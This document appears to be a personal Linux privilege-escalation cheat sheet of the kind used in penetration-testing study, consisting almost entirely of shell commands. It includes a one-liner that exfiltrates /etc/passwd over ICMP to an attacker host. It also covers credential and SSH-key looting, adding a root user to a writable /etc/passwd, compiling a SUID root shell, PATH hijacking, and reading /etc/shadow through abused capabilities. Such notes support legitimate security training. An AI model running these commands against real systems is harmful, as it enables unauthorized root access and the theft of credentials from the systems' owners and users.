# Linux Privilege Escalation Checklist
# References:
# https://guif.re/linuxeop (methodology to follow)
# https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
# https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
# https://payatu.com/guide-linux-privilege-escalation

# Tools:
# - linenum.sh
# - linPEAS
# - lse

# Exfiltrate users through ICMP
while read line; do ping -c 1 -p $(echo "$line" | cut -d ":" -f 1,2,3,7 | xxd -ps) <my_attacking_host>; done < /etc/passwd

# Check for useful tools
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp curl 2>/dev/null

# Check for running processes of other users (not your current one)
ps -elf | grep -v $(whoami)

# Enumeration with Linenum.sh
mkdir /tmp/linenum
cd /tmp/linenum
wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O ./linenum.sh
python -m http.server

On Target:
wget 'http://172.28.128.1:8000/linenum.sh' -O /tmp/linenum.sh

# Enumeration with LinPEAS
mkdir /tmp/linpeas
cd /tmp/linpeas
wget -c "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O /tmp/linpeas.sh
python -m http.server


# Enumeration with lse
TODO

# Looting Passwords
grep -nril 'password' /home/ 2> /dev/null
grep -R -i password /home/*  2> /dev/null
grep -nril 'password' /var/  2> /dev/null
find / -iname *password* 2>/dev/null
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

Also search for:
/home/*/.ssh/id*             ;; SSH keys, often passwordless
/tmp/krb5cc_*                ;; Kerberos tickets
/tmp/krb5.keytab             ;; Kerberos tickets
/home/*/.gnupg/secring.gpgs  ;; PGP keys

find / -type f -iname *.txt   2>/dev/null
find / -type f -iname *.zip   2>/dev/null
find / -type f -iname *.doc   2>/dev/null
find / -type f -iname *.xls   2>/dev/null
find / -type f -iname config* 2>/dev/null
find / -type f -iname *.rar   2>/dev/null
find / -type f -iname *.docx  2>/dev/null
find / -type f -iname *.sql   2>/dev/null

egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/www/* 2> /dev/null


Check: /etc/security/opasswd

## Writeable /etc/passwd
Generate a new hash by doing:
openssl passwd -1 -salt [salt] [password]
;; using salt "new" and password "123"
openssl passwd -1 -salt new 123
;; then, creating user called "newusername" and gids 3000 (we can choose this) and 0 (root):
echo 'newusername:$1$new$p7ptkEKU1HnaHpRtzNizS1:3000:0:new,,,:/tmp:/bin/bash' >> /etc/passwd
;; or
echo 'newusername:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd

## In-Memory Passwords
strings /dev/mem -n10 | grep -i PASS

## Files containing the string "password" in their name
updatedb
locate password

## SSH Keys
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

## Search each user's owned files
find / -user <username> -type f 2>/dev/null

## Last Edited Files
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"



# Detect CRON jobs

## View scheduled cron
cat /etc/crontab

## List all cron jobs
for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done

## Print commands and file system events and scan procfs every 1000 ms (=1sec)
pspy64 -pf -i 1000 

# Find SUID/SGID binaries
find / -perm -u=s -type f -exec ls -la {} 2>/dev/null \;
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;   ;; finds only SUID
find / -uid 0 -perm -4000 -type f 2>/dev/null               ;; finds only SUID

# Create SUID binaries
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit

# Exploiting SUID binaries using relative paths
## Relative Path (Whenever a SUID binary is calling a program, e.g., cat)
;; check if a binary is using relative names with "string"
string /path/to/binary.bin
echo $PATH
echo '/bin/bash' > /tmp/cat  ;; sometimes also try with '/bin/sh'
chmod 777 cat
export PATH=/tmp:$PATH
./path/to/binary.bin


# Capabilities

## Search for files with capabilities set
getcap -r / 2>/dev/null
;; generally we are particularly interested in the capabilities with "ep"
;; Let's say tar has "tar = cap_dac_read_search+ep", this means that tar
;; can read everything, hence we could abuse it to get the shadow file:
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar 
cat etc/shadow 

# Kernel Exploits
Check common linux exploits.
From a meterpreter session we can also do:

> run post/multi/recon/local_exploit_suggester

# Other
Check what is in /opt always, we may find interesting things.

# Programming Language Module Directory Writeable
;; Reference: https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
From time to time, you may come across a scenario where a system
has misconfigured permissions in their Python library. Generally,
directories that house Python modules have permissions set so that
modifications canâ€™t be made without elevated privileges. With that,
there are a number of ways that users can create this vulnerability:
1. The user creates their own Python module and forgets to restrict write
access to it.
2. The user decides to lessen restrictions within the
Python library directory.
3. The PATH variable for the Python library is configured to check 
the current directory first.

Regardless, in order to escalate privileges, we also need a way to execute
a Python script with elevated privileges. This either means looking for
a cronjob or scheduled task that executes Python scripts with either
elevated privileges or leveraging other vulnerabilities, for example,
through SUID files, to execute the script.  If we decide to explore
this avenue as a potential method to escalate privileges, we first need
to understand where Python looks within the file system to import its
modules. We can leverage the "sys" module in Python to do this.

    python -c 'import sys; print(sys.path)'

This output shows a list of directories that Python looks in when
importing modules. Python looks through this list in order. With this
information, we have an idea of which directories we need to enumerate
first. Once we find a directory we want to attack, we can start modifying
both a target Python script or the library.


# A recap of techniques

Kernel Exploits

Password Hunting

File Permissions

Sudo Attacks

Shell Escaping

Intended Functionality

LD_PRELOAD

CVE-2019-14287

CVE-2019-18634

SUID Attacks

Shared Object Injection

Binary Symlinks

Environment Variables

Programming Language Module Path Writeable

Capabilities Attacks

Scheduled Tasks

NFS

Docker
